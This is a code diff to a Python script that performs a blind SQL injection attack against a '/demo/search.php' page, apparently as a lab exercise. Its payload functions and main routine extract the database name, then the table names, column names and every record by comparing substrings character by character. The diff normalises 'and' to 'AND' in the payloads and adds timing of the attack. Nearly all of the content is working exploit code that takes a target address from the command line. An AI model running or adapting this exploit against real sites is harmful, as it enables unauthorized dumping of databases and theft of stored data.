@@ -1,6 +1,7 @@
 import requests
 import urllib.parse
 import sys
+import time
 
 db_name = ""
 current_table = ""
@@ -10,22 +11,22 @@ def get_url_lt(idx, ch, url_idx):
     if url_idx == 0:
         return f"alice' AND (SELECT SUBSTRING((SELECT DATABASE()), {idx},1)) < '{ch}"
     elif url_idx == 1:
-        return f"alice' and SUBSTRING((SELECT GROUP_CONCAT(TABLE_NAME SEPARATOR ' ') FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = '{db_name}'), {idx}, 1) < '{ch}"
+        return f"alice' AND SUBSTRING((SELECT GROUP_CONCAT(TABLE_NAME SEPARATOR ' ') FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = '{db_name}'), {idx}, 1) < '{ch}"
     elif url_idx == 2:
-        return f"alice' and SUBSTRING((SELECT GROUP_CONCAT(COLUMN_NAME SEPARATOR ' ') FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = '{db_name}' AND TABLE_NAME = '{current_table}'), {idx}, 1) < '{ch}"
+        return f"alice' AND SUBSTRING((SELECT GROUP_CONCAT(COLUMN_NAME SEPARATOR ' ') FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = '{db_name}' AND TABLE_NAME = '{current_table}'), {idx}, 1) < '{ch}"
     elif url_idx == 3:
-        return f"alice' and SUBSTRING((SELECT GROUP_CONCAT({current_attr} SEPARATOR ' ') FROM {current_table}), {idx}, 1) < '{ch}"
+        return f"alice' AND SUBSTRING((SELECT GROUP_CONCAT({current_attr} SEPARATOR ' ') FROM {current_table}), {idx}, 1) < '{ch}"
 
 
 def get_url_eq(idx, ch, url_idx):
     if url_idx == 0:
         return f"alice' AND (SELECT SUBSTRING((SELECT DATABASE()), {idx},1)) = '{ch}"
     elif url_idx == 1:
-        return f"alice' and SUBSTRING((SELECT GROUP_CONCAT(TABLE_NAME SEPARATOR ' ') FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = '{db_name}'), {idx}, 1) = '{ch}"
+        return f"alice' AND SUBSTRING((SELECT GROUP_CONCAT(TABLE_NAME SEPARATOR ' ') FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = '{db_name}'), {idx}, 1) = '{ch}"
     elif url_idx == 2:
-        return f"alice' and SUBSTRING((SELECT GROUP_CONCAT(COLUMN_NAME SEPARATOR ' ') FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = '{db_name}' AND TABLE_NAME = '{current_table}'), {idx}, 1) = '{ch}"
+        return f"alice' AND SUBSTRING((SELECT GROUP_CONCAT(COLUMN_NAME SEPARATOR ' ') FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = '{db_name}' AND TABLE_NAME = '{current_table}'), {idx}, 1) = '{ch}"
     elif url_idx == 3:
-        return f"alice' and SUBSTRING((SELECT GROUP_CONCAT({current_attr} SEPARATOR ' ') FROM {current_table}), {idx}, 1) = '{ch}"
+        return f"alice' AND SUBSTRING((SELECT GROUP_CONCAT({current_attr} SEPARATOR ' ') FROM {current_table}), {idx}, 1) = '{ch}"
 
 # url = "http://192.168.1.3/demo/search.php"
 def get_search_lt(idx, ch, url_idx):
@@ -110,6 +111,7 @@ def main():
         address = sys.argv[1]
     url  = f"http://{address}/demo/search.php"
     print(f"Attacking url: {url}")
+    start_time = time.time()
     global db_name
     db_name = guess_secret(url, 0).lower()
     print("DB_name:", db_name)
@@ -125,7 +127,9 @@ def main():
             current_attr = attr
             records = guess_secret(url,3).lower().split(" ")
             print(f"attr: {attr}: {records}")
-
+    end_time = time.time()
+    total_time = end_time - start_time
+    print(f"Attack took {total_time:.2f} seconds")
 
     pass
 
